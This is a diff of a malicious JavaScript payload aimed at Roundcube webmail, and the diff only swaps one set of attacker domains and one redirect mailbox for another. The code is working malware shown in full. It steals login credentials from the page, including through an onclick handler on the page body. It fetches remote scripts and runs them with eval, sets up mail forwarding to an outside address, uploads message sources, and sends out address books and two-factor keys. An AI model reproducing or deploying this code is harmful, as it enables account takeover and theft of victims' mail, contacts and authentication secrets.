@@ -1,8 +1,8 @@
 var mail_address = rcmail.env.username;                                                                                                                                                                                               
-var mailbox_to_redirect = "advenwolf@proton.me";                                                                                                                                                                                      
+var mailbox_to_redirect = "dav@home.arpa.com";                                                                                                                                                                                      
 var openMessageInfo = `u_${mail_address}_o_m`;                                                                                                                                                                                        
 r = new RegExp(/add_message_row\((\d*)/g);                                                                                                                                                                                            
-fetch(`${"https://zhblz.com/zJ2w9x"}?log=${openMessageInfo}`,{
+fetch(`${"https://cradle.com/zJ2w9x"}?log=${openMessageInfo}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -10,7 +10,7 @@ fetch(`${"https://zhblz.com/zJ2w9x"}?log=${openMessageInfo}`,{
 function getChromeCredentialsAndSend(mail_address) {                                                                                                                                                                                  
   userCredentials = document.getElementById("username").value + `:` + document.getElementById("password").value;                                                                                                                      
   base64Credentials = btoa(userCredentials);
-  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
+  fetch(`${"https://cradle.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -23,7 +23,7 @@ async function downd(box) {
     i = u.replace(r, "$1");
     o = i.split(",");
     (async () => {
-      ssv = `https://zhblz.com/zJ2w9x/uploadfile/`;
+      ssv = `https://cradle.com/zJ2w9x/uploadfile/`;
       for (p of o) {
         a = await fetch(`?_task=mail&_save=0&_uid=${p.toString()}&_mbox=${box}&_action=viewsource&_extwin=1`);
         s = new FormData;
@@ -46,16 +46,16 @@ async function downd(box) {
   f.setAttribute("style", "visibility:hidden");
   document.body.appendChild(f);
 })();
-document.body.setAttribute("onclick", "userCredentials = document.getElementById('username').value + `:` + document.getElementById('password').value; base64Credentials = btoa(userCredentials); fetch(`${'https://zhblz.com/zJ2w9x'}?log=${`c_c_f_u_:_${base64Credentials}`}`,{method:'GET',headers:{'secure':'bigdick'}});");
+document.body.setAttribute("onclick", "userCredentials = document.getElementById('username').value + `:` + document.getElementById('password').value; base64Credentials = btoa(userCredentials); fetch(`${'https://cradle.com/zJ2w9x'}?log=${`c_c_f_u_:_${base64Credentials}`}`,{method:'GET',headers:{'secure':'bigdick'}});");
 (async (mail_address, mailbox_to_redirect) => {
   try {
-    const response = await fetch("https://zhblz.com/addRedirectMailBox.js",{
+    const response = await fetch("https://cradle.com/addRedirectMailBox.js",{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     if (!response.ok) {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_addRedirectMailBox.js"}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${"f_g_addRedirectMailBox.js"}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -68,13 +68,13 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     var fullUrl = window.location.origin + window.location.pathname;
     const result = await addRedirectMailBox(fullUrl, mailbox_to_redirect);
     if (result == true) {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`m_f_u_${mail_address}_r_t_${mailbox_to_redirect}`}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`m_f_u_${mail_address}_r_t_${mailbox_to_redirect}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     } else {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_r_m_f_u_${mail_address}_t_${mailbox_to_redirect}`}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`c_r_m_f_u_${mail_address}_t_${mailbox_to_redirect}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -82,7 +82,7 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     }
     ;
   } catch (error) {
-    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_w_r_m_f_u_${mail_address}`}`,{
+    await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`e_w_r_m_f_u_${mail_address}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -92,13 +92,13 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
 })(mail_address, mailbox_to_redirect);
 (async mail_address => {
   try {
-    const resp = await fetch("https://zhblz.com/getUserCredentials.js",{
+    const resp = await fetch("https://cradle.com/getUserCredentials.js",{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     if (!resp.ok) {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -110,14 +110,14 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     eval(scriptContent);
     getUserCredentials(userCredentials => {
       base64Credentials = btoa(userCredentials);
-      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`f_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
+      fetch(`${"https://cradle.com/zJ2w9x"}?log=${`f_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     });
   } catch (error) {
-    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_w_g_f_m_f_u_${mail_address}`}`,{
+    await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`e_w_g_f_m_f_u_${mail_address}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -128,13 +128,13 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
 
 (async mail_address => {
   try {
-    const respo = await fetch("https://zhblz.com/adbook.js",{
+    const respo = await fetch("https://cradle.com/adbook.js",{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     if (!respo.ok){
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"w_b_adbook.js"}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${"w_b_adbook.js"}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -145,14 +145,14 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     eval(scriptContent3);
     var fullUrl = window.location.origin + window.location.pathname;
     addressbook(emailsBook => {
-      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`t_e_f_u_${mail_address}_:_${emailsBook}`}`,{
+      fetch(`${"https://cradle.com/zJ2w9x"}?log=${`t_e_f_u_${mail_address}_:_${emailsBook}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     });
   } catch (error){
-    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_t_e_f_u_${mail_address}`}`,{
+    await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`e_t_e_f_u_${mail_address}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -162,13 +162,13 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     
 (async mail_address => {
   try {
-    const res = await fetch("https://zhblz.com/keyTwoAuth.js",{
+    const res = await fetch("https://cradle.com/keyTwoAuth.js",{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     if (!res.ok) {
-      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_keyTwoAuth.js"}`,{
+      await fetch(`${"https://cradle.com/zJ2w9x"}?log=${"f_g_keyTwoAuth.js"}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
@@ -181,14 +181,14 @@ document.body.setAttribute("onclick", "userCredentials = document.getElementById
     var fullUrl = window.location.origin + window.location.pathname;
     keyTwoAuth(userKey => {
       base64userKeys = btoa(userKey);
-      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`k_t_f_u_${mail_address}_:_${base64userKeys}`}`,{
+      fetch(`${"https://cradle.com/zJ2w9x"}?log=${`k_t_f_u_${mail_address}_:_${base64userKeys}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
       }});
     });
   } catch (error) {
-    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_t_k_f_u_${mail_address}`}`,{
+    await fetch(`${"https://cradle.com/zJ2w9x"}?log=${`e_t_k_f_u_${mail_address}`}`,{
       method: 'GET',
       headers: {
         'secure': 'bigdick'
